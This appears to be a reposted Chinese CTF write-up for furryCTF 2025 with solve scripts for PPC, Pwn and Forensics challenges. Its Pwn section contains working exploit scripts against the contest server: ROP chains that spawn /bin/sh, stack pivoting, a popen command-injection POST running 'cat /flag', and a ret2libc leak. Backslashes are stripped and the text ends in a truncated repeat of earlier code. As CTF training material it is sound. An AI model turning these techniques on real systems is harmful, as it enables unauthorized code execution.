# 【比赛篇】furryCTF 2025 高校联合新神赛（PPC+Pwn+Forensics））

> 原文: https://www.ctfiot.com/298529.html
> ID: 298529

PPC

flagReader

这里我们打开发现安全说明叫我们解密bsae16，但是这里有480页，480个字符，脚本如下：

import requests
import base64

# 根据你的截图修改基础 URL
base_url = "http://ctf.furryctf.com:
32824"
chars = []

print("开始爬取 Base16 字符...")

# 循环爬取 1 到 480 页
for i in range(1, 481):
    try:
        # 对应源码中的 fetch(`${API_BASE}/flag/char/${position}`)
        response = requests.get(f"{base_url}/api/flag/char/{i}")
        data = response.json()
        if data['status'] == 'success':
            char = data['char']
            chars.append(char)
            # 每 50 个字符打印一次进度
            if i % 50 == 0:
                print(f"已完成: {i}/480")
        else:
            print(f"第 {i} 页获取失败: {data.get('error')}")
    
except Exception as e:
        print(f"请求异常: {e}")

# 拼接成完整的字符串
full_encoded_str = "".join(chars)
print("n拼接后的原始数据:")
print(full_encoded_str)

# 题目要求：Base16 解码 2 次
try:
    # 第一次 Base16 解码 (Base16 其实就是 Hex 十六进制)
    step1 = base64.b16decode(full_encoded_str.upper())
    # 第二次 Base16 解码
    final_flag = base64.b16decode(step1.upper())
    print("n[+] 最终 Flag:")
    print(final_flag.decode())
except Exception as e:
    print(f"n[-] 解码失败，请检查数据完整性: {e}")

成功获得flag：

furryCTF{21ec42bf-d921-4b81-9be2-c4160c68c2cc-79e5103e-81d1-49f7-b94f-0d2b719307a9-dccb8de2-2cb9-45a4-906a-7b6be4fcbfbf}

Emoji Engine

题目分析

题目要求连接一个 nc 端口，服务器会发送一段由 Emoji 组成的“字节码”，我们需要模拟一个基于堆栈的虚拟机（Stack-based VM）执行这些指令，并返回栈顶元素的数值。

已知条件：

指令集： Add, Sub, Mul, Div, Push, Pop, Swap, Dup, Xor, Exit。 数据类型： 32位有符号整数。 除法规则： 向零取整（例如 int(-5/2) = -2，而不是 Python 默认的 -3）。

逆向推导过程

通过不断的试错和观察报错信息，我们逐步还原了 Emoji 对应的指令逻辑和虚拟机的特殊行为。

指令映射推导

显而易见：

🤡  –>PUSH (入栈)

➕ –>ADD (加法)

➖–> SUB (减法)

🔄  –>SWAP (交换栈顶两个元素)

🛑 –> EXIT (结束)

逻辑推理：

✖️ (MUL): 在某些关卡中，使用了该符号后数值成倍增加，确认为乘法。 📦 (DUP): 这一步是关键。在 Level 2 等关卡中，出现了 📦 🔄 的组合。如果 📦 是 POP，栈深度减小无法交换；只有当它是 DUP (复制栈顶) 时，才能在单元素入栈后立即进行 SWAP 操作。 🐛 (XOR): 在 Level 5 和 Level 10 中，出现了类似 A 🐛 B = C 的逻辑。通过计算（如 67 🐛 100 = 39，而 67 ^ 100 = 39），确认为异或操作。 💀 (DIV): 在后期关卡中出现，用于减小数值幅度，且不符合减法特征，推测为除法。 ❓ / 👽 (POP): 其余未对栈顶数值产生算术影响的符号，推测为 POP（弹出/丢弃）。

核心机制：缺省补零

本题最大的坑：

通常虚拟机在栈为空时执行 POP 或 ADD 会报错。 但这个 Emoji VM 有一套容错机制：当操作数不足时，缺失的操作数默认为 0。 SUB (栈仅有 A): 执行 A – 0。 MUL (栈仅有 A): 执行 A * 0 = 0 (这是 Level 8 解题的关键)。 POP (空栈): 返回 0，不报错。

特殊机制：SWAP 的例外

在 Level 10 中，我们发现了一个例外：

SWAP 指令如果遇到栈元素不足 2 个的情况，不会补 0 进行交换，而是直接跳过（不做任何操作）。 如果强行补 0 交换，会导致栈顶多出一个 0，进而导致后续的 DUP 操作复制了错误的 0，导致计算结果错误。

exp.py：

from pwn import *
import ctypes
import time

HOST = 'ctf.furryctf.com'
PORT = 32827
context.log_level = 'info'

def to_int32(val):
    return ctypes.c_int32(val).value

OP_MAP = {
    '🤡': 'PUSH',
    '➕': 'ADD',
    '➖': 'SUB',
    '🔄': 'SWAP',
    '🛑': 'EXIT',
    '✖️': 'MUL', 
    '📦': 'DUP', 
    '🐛': 'XOR', 
    '💀': 'DIV',
    '❓': 'POP',
    '👽': 'POP',
    '📤': 'POP'
}

def run_vm(bytecode):
    stack = []
    tokens = bytecode.split()
    ip = 0
    
    while ip < len(tokens):
        opcode = tokens[ip]
        ip += 1
        
        op_type = OP_MAP.get(opcode, 'UNKNOWN')
        
        try:
            def get_operands():
                if len(stack) >= 2:
                    b = stack.pop()
                    a = stack.pop()
                    return a, b
                elif len(stack) == 1:
                    b = 0      
                    a = stack.pop()
                    return a, b
                else:
                    return 0, 0 

            def pop_safe():
                return stack.pop() if stack else 0
            
            def peek_safe():
                return stack[-1] if stack else 0

            if op_type == 'PUSH':
                if ip < len(tokens):
                    val = int(tokens[ip])
                    ip += 1
                    stack.append(val)

            elif op_type == 'ADD':
                a, b = get_operands()
                stack.append(to_int32(a + b))

            elif op_type == 'SUB':
                a, b = get_operands()
                stack.append(to_int32(a - b))

            elif op_type == 'MUL':
                a, b = get_operands()
                stack.append(to_int32(a * b)) 
            
            elif op_type == 'DIV':
                a, b = get_operands()
                if b == 0: 
                    stack.append(0)
                else: 
                    stack.append(int(a / b)) 

            elif op_type == 'XOR':
                a, b = get_operands()
                stack.append(to_int32(a ^ b))

            elif op_type == 'SWAP':
                if len(stack) >= 2:
                    b = stack.pop()
                    a = stack.pop()
                    stack.append(b)
                    stack.append(a)

            elif op_type == 'DUP':
                val = peek_safe()
                stack.append(val)

            elif op_type == 'POP':
                pop_safe()

            elif op_type == 'EXIT':
                break
            
            else:
                pop_safe()

        
except Exception:
            return 0

    return stack[-1] if stack else 0

def solve():
    while True:
        try:
            r = remote(HOST, PORT)
            break
        
except:
            time.sleep(1)

    for i in range(1, 101):
        try:
            r.recvuntil(f'Level {i}/100:'.encode())
            r.recvline()
            bytecode = r.recvline().decode().strip()
            
            ans = run_vm(bytecode)
            print(f"[*] Level {i} Ans: {ans}")
            r.sendline(str(ans).encode())
            
            while True:
                try:
                    line = r.recvline(timeout=0.4).decode().strip()
                    if not line: break
                    
                    if"Level"in line:
                        r.unrecv((line + 'n').encode())
                        break
                        
                    if"POFP{"in line:
                        print(f"n[!] FLAG: {line}")
                        return
                        
                
except Exception:
                    break
                
        
except EOFError:
            break
            
    r.interactive()

if __name__ == '__main__':
    solve()

POFP{7ea6031a-5213-403c-8f39-e06d2b19c4e6}

你是说这是个数学题？

解题思路

逆向分析：分析 Encrypt.py 源码，发现其逻辑是将 Flag 转换为二进制流后，通过大量的随机行变换（XOR操作）混淆数据。这在数学上等价于生成了一个线性方程组

数据提取：题目脚本末尾包含被注释掉的完整 matrix 和 result 数据，这是方程组的系数和常数项。

数学求解：使用高斯消元法在 GF(2) 域（模2运算）上求解该线性方程组，还原出 Flag 的原始二进制比特流。

变长解码：由于 bin(ord(c)) 产生的二进制长度不固定（如数字是6位，字母是7位），直接转字符会有歧义。编写 DFS（深度优先搜索）算法，在 Flag 格式 furryCTF{[0-9A-Za-z_]+} 的约束下，搜索出语义最通顺的解。

exp.py：

import ast
import sys

sys.setrecursionlimit(10000)

def solve():
    print("[-] Reading Encrypt.py ...")
    try:
        with open('Encrypt.py', 'r', encoding='utf-8') as f:
            content = f.read()
    
except UnicodeDecodeError:
        with open('Encrypt.py', 'r', encoding='gbk') as f:
            content = f.read()
    
except FileNotFoundError:
        print("[!] File not found.")
        return

    matrix_str = ""
    result_str = ""
    
    lines = content.splitlines()
    for line in lines:
        if line.startswith("#matrix="):
            matrix_str = line.replace("#matrix=", "").strip()
        elif line.startswith("#result="):
            result_str = line.replace("#result=", "").strip()
            
    if not matrix_str or not result_str:
        print("[!] Data not found.")
        return

    print("[-] Parsing data...")
    try:
        matrix = ast.literal_eval(matrix_str)
        result = ast.literal_eval(result_str)
    
except Exception as e:
        print(f"[!] Parse error: {e}")
        return

    aug_matrix = []
    for r_idx, row_str in enumerate(matrix):
        row_val = int(row_str, 2)
        row_val = (row_val << 1) | result[r_idx]
        aug_matrix.append(row_val)

    num_vars = len(matrix[0])
    rows = aug_matrix
    pivot_row_idx = 0
    
    print("[-] Gaussian Elimination...")
    for bit_pos in range(num_vars, 0, -1):
        if pivot_row_idx >= len(rows): break
        mask = 1 << bit_pos
        
        found = -1
        for r in range(pivot_row_idx, len(rows)):
            if rows[r] & mask:
                found = r
                break
        
        if found == -1: continue
            
        rows[pivot_row_idx], rows[found] = rows[found], rows[pivot_row_idx]
        
        curr_row_val = rows[pivot_row_idx]
        for r in range(len(rows)):
            if r != pivot_row_idx:
                if rows[r] & mask:
                    rows[r] ^= curr_row_val
        pivot_row_idx += 1

    solution_bits = ['?'] * num_vars
    for row_val in rows:
        if row_val <= 1: continue
        l = row_val.bit_length()
        var_pos = l - 1
        res = row_val & 1
        idx = num_vars - var_pos
        if 0 <= idx < num_vars:
            solution_bits[idx] = str(res)

    binary_string = "".join(solution_bits)
    if'?'in binary_string:
        binary_string = binary_string.replace('?', '0')

    print("[-] Decoding...")
    candidates = decode_all_candidates(binary_string)
    
    if candidates:
        def count_digits(s):
            return sum(c.isdigit() for c in s)
        candidates.sort(key=count_digits)
        
        print(f"n[+] Flag: {candidates[0]}")
    else:
        print("n[!] Decode failed.")

def decode_all_candidates(bits):
    import string
    allowed_chars = string.ascii_letters + string.digits + "_{}"
    char_map = {}
    for c in allowed_chars:
        char_map[c] = bin(ord(c)).replace("0b", "")
        
    prefix = "furryCTF{"
    current_bits = ""
    for c in prefix:
        current_bits += char_map[c]
        
    if not bits.startswith(current_bits):
        return []
        
    remaining = bits[len(current_bits):]
    results = []
    find_paths(remaining, char_map, [], results)
    
    return [prefix + "".join(r) for r in results]

def find_paths(bits, char_map, current_path, results):
    if len(results) > 20: 
        return
    if not bits:
        return
    if bits == char_map['}']:
        results.append(current_path + ['}'])
        return

    for char, binary in char_map.items():
        if char == '}' or char == '{': continue
        if bits.startswith(binary):
            find_paths(bits[len(binary):], char_map, current_path + [char], results)

if __name__ == '__main__':
    solve()

furryCTF{Xa2_Matrc8_Wi7h_On9_Unis5e_SaYk41on}

Pwn

nosystem

题目分析：

程序存在明显的栈溢出漏洞 (scanf(“%[^n]”, v4)，偏移 72)，但开启了 NX 保护，且没有 system 函数和 /bin/sh 字符串。程序中包含 syscall 指令（在 work 函数中），因此采用 Ret2Syscall 攻击。

解题关键点： 常规 Ret2Syscall 需要控制 rax 寄存器作为系统调用号（execve 为 59）。程序中没有简单的 pop rax gadget。通过 IDA 分析发现 Passcheck 函数的末尾（地址 0x40116E）存在一段特殊的汇编指令：

mov rax, r14
mov rdx, r15
retn

这被称为 Magic Gadget。结合 __libc_csu_init 中的通用 gadget（pop rbx, rbp, r12, r13, r14, r15），我们可以通过控制 r14 间接控制 rax，通过 r15 间接控制 rdx。

利用流程：

写入字符串：利用程序自带的 scanf 和 %[^n] 格式串，将 /bin/shx00 写入 .bss 段。 布置寄存器： rdi -> .bss 地址 (指向 /bin/sh)。 rsi -> 0。 r14 -> 59 (传递给 rax，对应 sys_execve)。 r15 -> 0 (传递给 rdx)。 触发 Shell：调用 Magic Gadget 转移寄存器值，最后调用 syscall。

exp.py：

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'critical'

binary_name = './nosystem'
elf = ELF(binary_name)
io = remote('ctf.furryctf.com', 32828)

bss_addr = elf.bss() + 0x100
scanf_plt = elf.plt['__isoc99_scanf']
syscall_addr = next(elf.search(b'x0fx05'))
fmt_str_addr = next(elf.search(b'%[^n]'))

csu_end_addr = 0x40134A
magic_gadget = 0x40116E
pop_rdi = 0x401353
pop_rsi = 0x401351

offset = 72
payload = b'A' * offset

payload += p64(pop_rdi) + p64(fmt_str_addr)
payload += p64(pop_rsi) + p64(bss_addr) + p64(0)
payload += p64(scanf_plt)

payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(pop_rsi) + p64(0) + p64(0)

payload += p64(csu_end_addr)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(59)
payload += p64(0)

payload += p64(magic_gadget)
payload += p64(syscall_addr)

io.recvuntil(b"think so?n")
io.sendline(payload)

io.sendline(b'/bin/shx00')

io.interactive()

furryCTF{5bbac3076208_WElC0me_7o_pWn_574cK_Sy57eM_Nwn}

SignIn

32位程序，NX 开启，PIE 关闭。

漏洞点在 gk 函数中

read(0, buf, 0x68) 读取 104 字节到 ebp-0x5c (92 字节) 处。仅有 12 字节溢出空间（覆盖 EBP + RET + 4字节参数），无法构造完整的 ROP 链，必须使用栈迁移技术。此外，程序执行了 close(1) 关闭了 stdout，Shell 命令输出需要重定向到 stderr (>&2)。

解题思路：

第一步

构造 payload 填充缓冲区。 利用 leave; ret 指令，劫持 EBP 指向 .bss 段（伪造栈）。 劫持返回地址跳转回 gk 函数中 lea eax, [ebp-0x5c]; … call read 处。 此时 EBP 已被篡改，read 会将数据写入我们指定的 .bss 地址。

第二步

在第二次 read 时，向 .bss 段写入 system(“/bin/sh”) 的 ROP 链。 布置 payload 尾部，使其在执行完 read 后的 leave; ret 时，再次进行栈迁移，将 ESP 切换到 .bss 上的 ROP 链头部。

get Flag:

获得 Shell 后，由于 stdout 关闭，利用 cat start.sh >&2 或 env >&2 查看 flag（后面看start.sh，发现flag 在环境变量中）。

exp.py：

from pwn import *
import time

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'critical'

io = remote('ctf.furryctf.com', 32829)
elf = ELF('./p')

fake_stack = elf.bss() + 0x800
system_plt = elf.plt['system']
lea_eax_ebp_5c = next(elf.search(b'x8dx45xa4'))
leave_ret = next(elf.search(b'xc9xc3'))

io.recvuntil(b'5.Byen')
io.sendline(b'4')
io.recvuntil(b'preparations have you made?n')

payload1 = b'A' * 92
payload1 += p32(fake_stack + 0x5c)
payload1 += p32(lea_eax_ebp_5c)

io.send(payload1)

binsh_addr = fake_stack + 12
payload2 = flat([
    system_plt,
    0xdeadbeef,
    binsh_addr,
    b'/bin/shx00'
])
payload2 = payload2.ljust(92, b'x00')
payload2 += p32(fake_stack - 4)
payload2 += p32(leave_ret)
payload2 = payload2.ljust(104, b'x00')

time.sleep(0.2)
io.send(payload2)

time.sleep(0.5)
io.send(b'env >&2; exitn')

print(io.recvall().decode(errors='ignore'))
io.close()

POFP{892358e7-e400-44e7-8095-6d6e46c09523}

post

考点：命令注入

漏洞点函数：popen()

原理：

程序在 main 函数中处理网络请求。当检测到请求以 “POST ” 开头时，代码逻辑寻找 HTTP 头部的结束标志 rnrn。程序未对后续内容进行任何过滤，直接通过 std::
string::
substr 截取 rnrn 之后的所有内容（即 HTTP Body），并将其传入 popen() 当作 Shell 命令执行，最后将执行结果回显给用户。

解法：构造一个符合 HTTP 格式的 POST 请求，在头部结束符 rnrn 之后直接写入系统命令 cat /flag。

int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  const char *v9; // rax
  size_t v10; // rbx
  const void *v11; // rsi
  char v12; // [rsp+3h] [rbp-20BDh] BYREF
  socklen_t addr_len; // [rsp+4h] [rbp-20BCh] BYREF
  int fd; // [rsp+8h] [rbp-20B8h]
  int v15; // [rsp+Ch] [rbp-20B4h]
  __int64 v16; // [rsp+10h] [rbp-20B0h]
  FILE *stream; // [rsp+18h] [rbp-20A8h]
  char *v18; // [rsp+20h] [rbp-20A0h]
  char *v19; // [rsp+28h] [rbp-2098h]
  struct sockaddr addr; // [rsp+30h] [rbp-2090h] BYREF
  _BYTE v21[32]; // [rsp+40h] [rbp-2080h] BYREF
  _BYTE v22[32]; // [rsp+60h] [rbp-2060h] BYREF
  _BYTE v23[32]; // [rsp+80h] [rbp-2040h] BYREF
  char s[24]; // [rsp+A0h] [rbp-2020h] BYREF
  char v25[24]; // [rsp+10A0h] [rbp-1020h] BYREF
  unsigned __int64 v26; // [rsp+20A8h] [rbp-18h]

  v26 = __readfsqword(0x28u);
  *(_QWORD *)&addr.sa_data[6] = 0;
  addr_len = 16;
  fd = socket(2, 1, 0);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x1F90u);
  bind(fd, &addr, 0x10u);
  listen(fd, 3);
  v3 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Vulnerable POST Web server running on port ");
  v4 = std::
ostream::
operator<<(v3, 8080);
  std::
operator<<<std::
char_traits<char>>(v4, "...n");
while ( 1 )
  {
    v15 = accept(fd, &addr, &addr_len);
    memset(s, 0, 0x1000u);
    read(v15, s, 0xFFFu);
    v5 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Request:n");
    v6 = std::
operator<<<std::
char_traits<char>>(v5, s);
    std::
ostream::
operator<<(v6, &std::
endl<char,std::
char_traits<char>>);
    v18 = &v12;
    std::
string::
basic_string<std::
allocator<char>>(
      v21,
      "HTTP/1.1 200 OKrnContent-Type: text/htmlrnConnection: closernrn",
      &v12);
    std::
__new_allocator<char>::~__new_allocator(&v12);
    v19 = &v12;
    std::
string::
basic_string<std::
allocator<char>>(v22, s, &v12);
    std::
__new_allocator<char>::~__new_allocator(&v12);
    if ( std::
string::
rfind(v22, "POST ", 0) )
    {
      if ( std::
string::
rfind(v22, "GET / ", 0) )
        std::
string::
operator+=(v21, "Not Foundn");
      else
        std::
string::
operator+=(
          v21,
          "<html><h1>Welcome to the furryctf competition.
We hope you will becom"
          "e a master of webpwn.</h1></html>n");
    }
    else
    {
      v16 = std::
string::
find(v22, "rnrn", 0);
      if ( v16 != -1 )
      {
        std::
string::
substr(v23, v22, v16 + 4, -1);
        v7 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Executing command: ");
        v8 = std::
operator<<<char>(v7, v23);
        std::
ostream::
operator<<(v8, &std::
endl<char,std::
char_traits<char>>);
        v9 = (const char *)std::
string::
c_str(v23);
        stream = popen(v9, "r");
        if ( stream )
        {
          while ( fgets(v25, 4096, stream) )
            std::
string::
operator+=(v21, v25);
          pclose(stream);
        }
        std::
string::~string(v23);
      }
    }
    v10 = std::
string::
size(v21);
    v11 = (const void *)std::
string::
c_str(v21);
    write(v15, v11, v10);
    close(v15);
    std::
string::~string(v22);
    std::
string::~string(v21);
  }
}

exp.py：

from pwn import *

HOST = 'ctf.furryctf.com'
PORT = 32830

def exploit():
    try:
        io = remote(HOST, PORT)

        command = b"cat /flag"

        payload = b"POST / HTTP/1.1rn"
        payload += b"Host: pwnrn"
        payload += b"rn"
        payload += command

        print(f"[*] Sending payload: {payload}")

        io.send(payload)

        response = io.recvall(timeout=5)

        print("n[+] Response from server:")
        print(response.decode(errors='ignore'))

        io.close()

    
except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    exploit()

POFP{b1c31c33-eb7c-4947-aca3-8ec6087e6758}

ret2vdso

程序架构：32位 ELF，开启 NX 保护，关闭 PIE，开启 ASLR。

漏洞函数：pwnme()

漏洞原理：栈溢出。

程序中定义了局部变量 v1 大小为 256 字节（0x100）。 调用 read(0, v1, 0x400u) 读取输入，允许读取 1024 字节。 输入超过 0x100 + 4 (ebp) = 260 字节即可覆盖返回地址。

偏移计算：IDA 显示 v1 位于 ebp-0x10C，覆盖返回地址（EIP）所需偏移为 0x10C + 4 = 272 字节。

解题思路

由于开启了 NX 保护无法执行 Shellcode，且题目提供了完整的 PLT/GOT 表，采用 Ret2Libc 攻击技术。

泄露 Libc 地址

利用栈溢出构造 ROP 链：write(1, got_write, 4)。 将返回地址指向 main 函数，以便泄露地址后程序重启，进行二次利用。 发送 Payload，接收 write 函数在内存中的真实地址。

确认 Libc 版本

根据泄露的 write 地址结尾 b60 和 read 地址结尾 980，在 libc.rip 查询。 确定远程环境为：libc6_2.39-0ubuntu8.6_i386。 获取关键偏移： write: 0x117b60 system: 0x50430 str_bin_sh: 0x1c4de8

Get Shell

计算基址：Libc_Base = Real_Write_Addr – Offset_Write。 计算 system 和 /bin/sh 的真实地址。 程序重启回到 pwnme 后，发送 Payload 2：padding + ret(对齐栈) + system + dummy_ret + binsh_addr。 注意：为了防止 Ubuntu 24.04 (Glibc 2.39) 下的 movaps 指令导致 Crash，在调用 system 前增加一个 ret 指令进行栈对齐。

exp.py：

from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

binary_file = './ret2vdso_x32'
elf = ELF(binary_file)
io = remote('ctf.furryctf.com', 32831)

offset = 272

io.recvuntil(b'> ')

payload1 = flat([
    b'A' * offset,
    elf.plt['write'],
    elf.sym['main'],
    1,
    elf.got['write'],
    4
])

io.sendline(payload1)

write_addr = u32(io.recv(4))
print(f"Leaked write address: {hex(write_addr)}")

OFFSET_WRITE = 0x117b60
OFFSET_SYSTEM = 0x50430
OFFSET_BINSH = 0x1c4de8

libc_base = write_addr - OFFSET_WRITE
system_addr = libc_base + OFFSET_SYSTEM
binsh_addr = libc_base + OFFSET_BINSH

print(f"Libc Base: {hex(libc_base)}")
print(f"System: {hex(system_addr)}")
print(f"Binsh: {hex(binsh_addr)}")

io.recvuntil(b'> ')

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload2 = flat([
    b'A' * offset,
    ret_gadget,
    system_addr,
    0xdeadbeef,
    binsh_addr
])

io.sendline(payload2)
io.sendline(b'cat flag')
io.interactive()

POFP{ef038613-5328-4598-a2b1-85c364de24e1}

Forensics

深夜来客

下载附件，里面有一个pcapng的文件，我们使用wireshark打开

根据题目我们首先输入ftp进行过滤

这里我们发现服务器软件为 Wing FTP Server

这里我们发现攻击者使用用户名 anonymous 和密码 IEUser@ 成功登录了 FTP 服务器，这里应该是匿名登录

这里我们看到其Uploaded 0 files，说明攻击者并未成功通过 FTP 传输文件。通过观察后面并没有发现什么可疑的数据包，推测攻击者大概率转向了该软件的 Web 管理接口（HTTP）

接下来我们看看http，输入过滤http包，重点看POST请求

这个包发现其应该是nmap扫描的包

这里这个POST请求我们右键追踪一下其HTTP流

POST / HTTP/1.1
Host: 192.168.136.1
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
Content-Length: 88
Connection: close
Content-Type: application/x-www-form-urlencoded

<methodCall><methodName>system.listMethods</methodName></methodCall>HTTP/1.0 200 HTTP OK
Server: Wing FTP Server(Free Edition)
Cache-Control: no-store
Content-Type: text/html
Content-Length: 8209
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Connection: close

<html>
<head>
<title>Wing FTP Server - Web Client</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="no-cache, must-revalidate" />
<meta http-equiv="Expires" content="0" />
<link rel="Shortcut Icon" href="images/logo.ico" type="image/x-icon">
<link rel="stylesheet" href="css/bulma.min.css" type="text/css">
<link rel="stylesheet" href="css/allfonts.min.css" type="text/css">


<!--[if lt IE 9]>
  
<![endif]-->

<script language="javascript">

if(!navigator.cookieEnabled)
{
 alert("Cookies must be enabled on your browser!");
}

function $(obj)
{
returndocument.getElementById(obj);
}

function ch()
{
if ($("username_val").value=="")
 {
  alert("Please enter your account name!");
  $("username_val").focus();
returnfalse;
 }
 $("username").value = $("username_val").value.replace(/+/g,"t");
 $("password").value = $("password_val").value.replace(/+/g,"t");
returntrue;
}

function setCookie(name,value,date) 
{
document.cookie = name + "=" + escape(value) + "; expires=" + date.toGMTString() + "; path=/;";
}

function getCookie(name) 
{
var search; 
 search = name + "="
 offset = document.cookie.indexOf(search) 
if (offset != -1) 
 { 
  offset += search.length ; 
  end = document.cookie.indexOf(";", offset) ; 
if (end == -1) 
  end = document.cookie.length; 
returnunescape(document.cookie.substring(offset, end)); 
 } 
else
 {
return""; 
 }
}

function deleteCookie(name) 
{
var expdate = newDate(); 
 expdate.setTime(expdate.getTime() - (86400*1000)); 
 setCookie(name, "", expdate); 
}

var langindexArr = newArray("english","french","german","italian","dutch","portuguese","spanish","schinese","tchinese","japanese","czech","romanian","turkish","korean","polish");
var langArr = newArray("English","French","German","Italian","Dutch","Portuguese","Spanish","Simplified Chinese","Traditional Chinese","Japanese","Czech","Romanian","Turkish","Korean","Polish");

if(navigator.cookieEnabled)
{
if(getCookie("client_lang") == "" && location.search.indexOf("?lang") == -1)
 {
var language = null;
if (navigator.appName == 'Netscape')
   language = navigator.language;
else
   language = navigator.browserLanguage;

if (language.indexOf('en') > -1) location = 'login.html?lang=english';
elseif (language.indexOf('fr') > -1) location = 'login.html?lang=french';
elseif (language.indexOf('de') > -1) location = 'login.html?lang=german';
elseif (language.indexOf('it') > -1) location = 'login.html?lang=italian';
elseif (language.indexOf('nl') > -1) location = 'login.html?lang=dutch';
elseif (language.indexOf('pt') > -1) location = 'login.html?lang=portuguese';
elseif (language.indexOf('es') > -1) location = 'login.html?lang=spanish';
elseif (language.indexOf('zh-TW') > -1) location = 'login.html?lang=tchinese';
elseif (language.indexOf('zh-HK') > -1) location = 'login.html?lang=tchinese';
elseif (language.indexOf('zh-MO') > -1) location = 'login.html?lang=tchinese';
elseif (language.indexOf('zh') > -1) location = 'login.html?lang=schinese';
elseif (language.indexOf('ja') > -1) location = 'login.html?lang=japanese';
elseif (language.indexOf('cz') > -1) location = 'login.html?lang=czech';
elseif (language.indexOf('ro') > -1) location = 'login.html?lang=romanian';
elseif (language.indexOf('tr') > -1) location = 'login.html?lang=turkish';
elseif (language.indexOf('ko') > -1) location = 'login.html?lang=korean';
elseif (language.indexOf('pl') > -1) location = 'login.html?lang=polish';
else location = 'login.html?lang=english';
 }
else
 {
  langArr = newArray("English","Fran..ais","Deutsch","Italiano","Nederlands","Portugu..s","Espa..ol","............","............",".........","Czech","Romanian","T..rk..e",".........","Polski");
 }
}

function changelanguage(obj)
{
var l = obj.options[obj.selectedIndex].value;
 location = 'login.html?lang='+l;
}

function switchcheckbox()
{
if($("remember").checked == false)
 {
  deleteCookie("client_login_name");
 }
}

function showQRcode()
{
if($("qrcode").style.display == "none" || $("qrcode").style.display == "")
  $("qrcode").style.display = "block";
else
  $("qrcode").style.display = "none";
}
</script>

</head>




<form class="box" method="post" action="loginok.html">




Web Client




    
    
   
      
    




    
    
   
      
    






    <select id="lang_sel" onchange="changelanguage(this)">
    </select>


    
    






Remember me


Download App
[](https://wftpserver.com/download_client.html)








 Login 



</form>



   FTP server software powered by [Wing FTP Server v7.4.4](https://www.wftpserver.com/)





</html>

<script language="javascript">
if(navigator.cookieEnabled)
{
for(var index in langArr)
 {
  $("lang_sel").options.add(new Option(langArr[index],langindexArr[index]));
if(getCookie("client_lang") == langindexArr[index])
   $("lang_sel").options[index].selected = true;
 }
}

$("username_val").focus();

</script>

<noscript><H2>The web client requires that you have Javascript enabled on your browser.
If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></noscript>

关键发现

在分析POST请求时，发现了一个包含base64编码的flag：

这个编码字符串出现在针对/loginok.html的POST请求中，是攻击者尝试的SQL注入payload的一部分。解码flag使用base64解码工具对编码字符串进行解码：

ZnVycnlDVEZ7RnIwbV9Bbm9uOW0wdXNfVG9fUm8wdH0=

攻击原理分析

FTP服务漏洞 攻击者首先通过FTP服务的匿名登录功能（USER anonymous）成功登录到服务器。虽然FTP服务器上没有文件，但攻击者发现了服务器还运行着Web界面（Wing FTP Server的Web客户端）。

SQL注入攻击 攻击者使用SQLMap工具对Web登录页面（/loginok.html）进行SQL注入攻击：

权限提升 flag的内容Fr0m_Anon9m0us_To_Ro0t暗示了攻击者的目标：从匿名用户权限提升到root权限。这也是为什么FTP服务器会被攻击的原因 – 它只是攻击者获取服务器访问权限的入口点。


```
import requests
import base64

# 根据你的截图修改基础 URL
base_url = "http://ctf.furryctf.com:
32824"
chars = []

print("开始爬取 Base16 字符...")

# 循环爬取 1 到 480 页
for i in range(1, 481):
    try:
        # 对应源码中的 fetch(`${API_BASE}/flag/char/${position}`)
        response = requests.get(f"{base_url}/api/flag/char/{i}")
        data = response.json()
        if data['status'] == 'success':
            char = data['char']
            chars.append(char)
            # 每 50 个字符打印一次进度
            if i % 50 == 0:
                print(f"已完成: {i}/480")
        else:
            print(f"第 {i} 页获取失败: {data.get('error')}")
    
except Exception as e:
        print(f"请求异常: {e}")

# 拼接成完整的字符串
full_encoded_str = "".join(chars)
print("n拼接后的原始数据:")
print(full_encoded_str)

# 题目要求：Base16 解码 2 次
try:
    # 第一次 Base16 解码 (Base16 其实就是 Hex 十六进制)
    step1 = base64.b16decode(full_encoded_str.upper())
    # 第二次 Base16 解码
    final_flag = base64.b16decode(step1.upper())
    print("n[+] 最终 Flag:")
    print(final_flag.decode())
except Exception as e:
    print(f"n[-] 解码失败，请检查数据完整性: {e}")
furryCTF{21ec42bf-d921-4b81-9be2-c4160c68c2cc-79e5103e-81d1-49f7-b94f-0d2b719307a9-dccb8de2-2cb9-45a4-906a-7b6be4fcbfbf}
from pwn import *
import ctypes
import time

HOST = 'ctf.furryctf.com'
PORT = 32827
context.log_level = 'info'

def to_int32(val):
    return ctypes.c_int32(val).value

OP_MAP = {
    '🤡': 'PUSH',
    '➕': 'ADD',
    '➖': 'SUB',
    '🔄': 'SWAP',
    '🛑': 'EXIT',
    '✖️': 'MUL', 
    '📦': 'DUP', 
    '🐛': 'XOR', 
    '💀': 'DIV',
    '❓': 'POP',
    '👽': 'POP',
    '📤': 'POP'
}

def run_vm(bytecode):
    stack = []
    tokens = bytecode.split()
    ip = 0
    
    while ip < len(tokens):
        opcode = tokens[ip]
        ip += 1
        
        op_type = OP_MAP.get(opcode, 'UNKNOWN')
        
        try:
            def get_operands():
                if len(stack) >= 2:
                    b = stack.pop()
                    a = stack.pop()
                    return a, b
